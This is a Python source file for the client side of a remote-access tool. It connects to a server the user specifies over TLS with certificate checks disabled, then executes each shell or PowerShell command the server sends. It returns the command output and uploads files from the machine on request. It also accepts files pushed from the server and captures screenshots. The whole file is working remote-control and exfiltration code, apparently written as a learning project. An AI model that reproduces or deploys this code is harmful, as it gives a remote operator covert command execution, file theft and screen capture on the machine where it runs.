import socket
import os
import subprocess
from time import sleep
import pyautogui
import sys
import ssl
from download_upload import Download_and_Upload

class client:


    def __init__(self,server_ip,server_port):
        self.server_ip=server_ip
        self.server_port=server_port
        self.client_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.secure_client_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)


    def client_upload (self,path_input):
        upload_obj=Download_and_Upload(self.secure_client_socket)
        upload_obj.upload(path_input)

    def client_download(self,file_path):
        script_dir = os.path.dirname(os.path.abspath(__file__))
        download_dir = os.path.join(script_dir, "Downloads")
        file_name_with_ext = os.path.basename(file_path)
        file_name=os.path.join(download_dir, file_name_with_ext)
        if not os.path.exists(download_dir):
            os.makedirs(download_dir)
        counter = 1
        while os.path.exists(file_name):
            name, extention = os.path.splitext(file_name)
            file_name = f"{name}({counter}){extention}"
            counter += 1            

        download_obj=Download_and_Upload(self.secure_client_socket)
        download_obj.download(file_name)



    def client_connector(self):
        try:
            print("Client connected successfully\n")
            while True:
                command=self.secure_client_socket.recv(2048)
                command_string = command.decode()


                if command_string.startswith("cd"):
                    path_input=command_string.strip("cd ")

                    if os.path.exists(path_input):
                        os.chdir(path_input)
                        continue
                    else:
                        print("Path does not exist!\n")
                        continue

                if command_string.startswith("download"):
                    path_input=command_string.strip("download ")
                    self.client_upload(path_input) # Server download equals client upload!
                    continue

                if command_string.startswith("help"):
                    continue
                if command_string=="about":
                    continue

                if command_string.startswith("upload"): 

                    file_path = command_string.strip("upload ")
                    self.client_download(file_path)
                    continue

                if command_string=="":
                    self.secure_client_socket.close()
                    break
                elif command_string=="Exit":
                    new_client.client_socket.close()
                    sys.exit(0)
                elif command_string=="screenshot":
                    script_dir = os.path.dirname(os.path.abspath(__file__)) 
                    shot_dir = os.path.join(script_dir, "Screenshots") 
                    if not os.path.exists(shot_dir):
                        os.makedirs(shot_dir)
                    x=0
                    file_name=""
                    file_name = os.path.join(shot_dir, f"shot{x}.png")
                    screenshot = pyautogui.screenshot()
                    while os.path.exists(file_name):
                        x+=1
                        file_name = os.path.join(shot_dir, f"shot{x}.png")
                    screenshot.save(file_name)
                    print("Screenshot saved at:{}".format(file_name))
                    continue

                if os.name == 'nt':
                    response = subprocess.run(f"powershell.exe -Command {command_string}",shell=True,capture_output=True)
                else:
                    response = subprocess.run([command_string],shell=True,capture_output=True)
                if response.stderr.decode() == "":
                    response_byte = response.stdout
                else:
                    response_byte=response.stderr
                response_byte= response_byte.decode()+"ENDOFMESSAGE"
                self.secure_client_socket.sendall(response_byte.encode())
                
        except ConnectionRefusedError: 
             print(f"Connection refused. Make sure the server is running at {self.server_ip}:{self.server_port}")
        except socket.gaierror:
            print(f"Address resolution error. Could not resolve {self.server_ip}.")
        except Exception as e: 
            print(f"Exception occurred: {e}")
            self.secure_client_socket.close()
            return
        except KeyboardInterrupt:
            self.handle_exit()
        finally:
            self.secure_client_socket.close()
            self.client_socket.close()


    def handle_exit(self):
        if self.secure_client_socket and not self.secure_client_socket._closed:
                self.secure_client_socket.close()
                sys.exit(0)


        
                


if __name__=="__main__":

    while True:
        input_ip = input("Enter the server's IP address to connect to (e.g., 192.168.1.12):\n").strip()
        if not input_ip:
            print("IP address cannot be empty.")
            continue
        try:
            socket.inet_aton(input_ip)
            break
        except socket.error:
            print("Invalid IP address format. Please enter a valid IPv4 address.")

    while True:
        input_port_str = input("Enter the server's port number (e.g., 7900):\n").strip()
        if not input_port_str:
            print("Port number cannot be empty.")
            continue
        try:
            input_port = int(input_port_str)
            if 0 < input_port <= 65535:
                break
            else:
                print("Port number must be between 1 and 65535.")
        except ValueError:
            print("Invalid port number. Please enter a number.")

    new_client = client(input_ip,input_port)
    try:
        context=ssl.create_default_context()
        context.check_hostname=False # because this is self signed
        context.verify_mode=ssl.CERT_NONE
        new_client.secure_client_socket=context.wrap_socket(new_client.client_socket)

        new_client.secure_client_socket.connect((new_client.server_ip,int(new_client.server_port)))
        new_client.client_connector()
    except KeyboardInterrupt:
        new_client.handle_exit()
    except Exception as e:
        print(f"Exception occurred:{e}. Exiting the program...\n")
        new_client.client_socket.close()
